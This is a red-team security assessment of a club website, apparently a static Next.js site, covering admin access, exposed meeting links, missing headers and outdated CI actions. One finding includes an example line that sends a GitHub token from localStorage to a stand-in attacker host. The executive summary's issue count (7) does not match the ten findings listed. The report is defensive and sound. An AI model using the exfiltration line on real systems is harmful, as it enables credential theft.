# Red Team Security Assessment — cybervt.org

**Date:** 2026-06-07
**Scope:** Full site (all pages, source code, CI/CD, deployment config)
**Methodology:** Browser-based exploration + source code review + HTTP header analysis

---

## Executive Summary

7 issues found: **3 HIGH**, **4 MEDIUM**, **3 LOW**

The site is a static Next.js export hosted on GitHub Pages. As a static site, server-side injection is off the table, but several significant issues were identified — particularly around the unprotected admin page, missing security headers, and publicly exposed Zoom meeting links.

---

## HIGH Priority

### H-1: Admin Page Has No Authentication

**URL:** https://cybervt.org/admin
**Category:** Access Control

The `/admin` page is publicly accessible with zero authentication. Anyone can:
- View all club events and their full details (including Zoom links)
- Download the events.json data
- See the admin interface for adding/editing/deleting events

While saving to GitHub requires a valid PAT, the page itself leaks the admin interface and all event data. The page is hidden from navigation (`showInNav: false`) but this is security through obscurity — the URL is guessable and discoverable.

**Reproduction:**
1. Navigate to https://cybervt.org/admin
2. Observe full admin interface with events, edit/delete controls, and GitHub token input

**Fix:** Add a simple password gate (e.g., a hardcoded hash check in the static page, or a Netlify-style `_redirects` with basic auth proxy). Even a client-side password prompt would deter casual access. Better: move event editing to a protected branch-based workflow.

---

### H-2: Zoom Meeting Links Publicly Exposed

**URL:** https://cybervt.org/calendar (view-source)
**Category:** Information Disclosure

Zoom meeting links are embedded in the page's `__NEXT_DATA__` script tag and visible to anyone viewing the page source. Two live Zoom links were found:

- `https://virginiatech.zoom.us/j/123456789` (SummitCTF Planning Session)
- `https://virginiatech.zoom.us/j/987654321` (Alumni Guest Speaker)

These links are also present in the publicly accessible admin.json Next.js data file and in the calendar page HTML. Anyone can join these meetings or Zoombomb them.

**Reproduction:**
1. Visit https://cybervt.org/calendar
2. View page source, search for `zoom.us`

**Fix:** Remove Zoom links from events.json for public-facing data. Instead, require Discord authentication or VT login to access meeting links. Store links separately from public event data.

---

### H-3: Critical Security Headers Missing

**URL:** All pages
**Category:** Security Configuration

The site is missing all major security headers:

| Header | Status |
|---|---|
| Content-Security-Policy | MISSING |
| X-Frame-Options | MISSING |
| X-Content-Type-Options | MISSING |
| Referrer-Policy | MISSING |
| Permissions-Policy | MISSING |
| Strict-Transport-Security | PRESENT |

Additionally, `access-control-allow-origin: *` is set on all responses, allowing any origin to read responses.

Combined, this means the site has no protection against:
- Clickjacking (no X-Frame-Options)
- MIME-type sniffing attacks (no X-Content-Type-Options)
- XSS via inline scripts (no CSP)
- Cross-origin data leakage (CORS wildcard)

**Reproduction:**
```bash
curl -sI https://cybervt.org | grep -i 'x-frame\|content-security\|x-content-type'
# Returns nothing
```

**Fix:** GitHub Pages doesn't support custom headers natively. Options:
1. Add a `<meta http-equiv="Content-Security-Policy">` tag in `_document.tsx` or `page-header.tsx`
2. Use Cloudflare Pages (free tier) in front of GitHub Pages for custom headers
3. At minimum, add `X-Frame-Options: DENY` and `X-Content-Type-Options: nosniff` via meta tags

---

## MEDIUM Priority

### M-1: GitHub PAT Stored in localStorage (No HttpOnly)

**File:** `pages/admin.tsx` (lines 70-79, 192)
**Category:** Credential Storage

The admin page stores the GitHub Personal Access Token in `localStorage` under the key `cybervt_gh_token`. If any XSS vulnerability existed (or is introduced in the future), an attacker could steal this token with:

```javascript
fetch('https://evil.com/steal?t=' + localStorage.getItem('cybervt_gh_token'))
```

This token has read/write access to the entire `cybervt/cybervt.org` repository, allowing an attacker to:
- Modify events.json (deface the site, inject malicious content)
- Push arbitrary code to the repository
- Modify GitHub Actions workflows

**Fix:** Never store write-scoped tokens in localStorage. Instead, use a GitHub OAuth App with limited scopes and server-side token exchange, or implement a serverless function (Cloudflare Workers, Vercel Functions) to proxy GitHub API calls.

---

### M-2: Broken Navigation Links (404s)

**URL:** https://cybervt.org/community, https://cybervt.org/resources
**Category:** Functional

The navigation bar has "community" and "resources" parent buttons that link to `#` (hash). These parent pages don't exist (/community, /resources both 404). The child pages (gallery, discord, instagram, readme, newsletter) work correctly from the dropdown, but:
- Direct navigation to `/community` or `/resources` shows 404
- Screen readers and keyboard users may try to navigate to these URLs
- Search engines may index these 404s

**Fix:** Either create placeholder pages at `/community` and `/resources`, or ensure parent buttons don't generate navigable URLs.

---

### M-3: EOL Node.js in CI Pipeline

**File:** `.github/workflows/pages.yml` (line 53)
**Category:** Supply Chain

The GitHub Actions workflow uses **Node.js 16**, which reached End-of-Life in September 2023 and no longer receives security patches. Also uses deprecated `::set-output` command syntax (GitHub deprecated this in 2023).

**Fix:** Upgrade to `actions/setup-node@v4` with `node-version: "20"` or `"22"`. Replace `::set-output` with `$GITHUB_OUTPUT`.

---

### M-4: Outdated GitHub Actions

**File:** `.github/workflows/pages.yml`
**Category:** Supply Chain

Multiple actions are on outdated major versions:
- `actions/checkout@v3` → current is v4
- `actions/setup-node@v3` → current is v4
- `actions/configure-pages@v2` → current is v5
- `actions/cache@v3` → current is v4

While not immediately exploitable, outdated actions may have unpatched vulnerabilities.

---

## LOW Priority

### L-1: No robots.txt
No `robots.txt` file exists. Not a vulnerability, but search engines will crawl everything including `/admin`.

### L-2: No sitemap.xml
Missing sitemap — SEO/reach issue, not security.

### L-3: Instagram URL Placeholder Comment
`src/config.ts` line 195 has: `url: 'https://www.instagram.com/cybervt', // Replace with actual Instagram URL` — this comment suggests incomplete configuration. The URL is actually valid, so the comment is stale.

---

## What's Working Well

- **HTTPS enforced** — Strict-Transport-Security header is present
- **No hardcoded secrets** — `.env` files properly gitignored, no API keys in source
- **No source maps in production** — `out/` directory has no `.map` files
- **React XSS protection** — Event data rendered via JSX is auto-escaped by React
- **`.git` directory not exposed** — 404s as expected
- **GitHub Pages permissions** — Workflow uses least-privilege `contents: read, pages: write`

---

## Summary Table

| ID | Issue | Severity | Category |
|----|-------|----------|----------|
| H-1 | Admin page has no authentication | HIGH | Access Control |
| H-2 | Zoom meeting links publicly exposed | HIGH | Information Disclosure |
| H-3 | Critical security headers missing | HIGH | Security Config |
| M-1 | GitHub PAT in localStorage | MEDIUM | Credential Storage |
| M-2 | Broken nav links (404s) | MEDIUM | Functional |
| M-3 | EOL Node.js in CI | MEDIUM | Supply Chain |
| M-4 | Outdated GitHub Actions | MEDIUM | Supply Chain |
| L-1 | No robots.txt | LOW | Configuration |
| L-2 | No sitemap.xml | LOW | Configuration |
| L-3 | Stale Instagram URL comment | LOW | Code Quality |
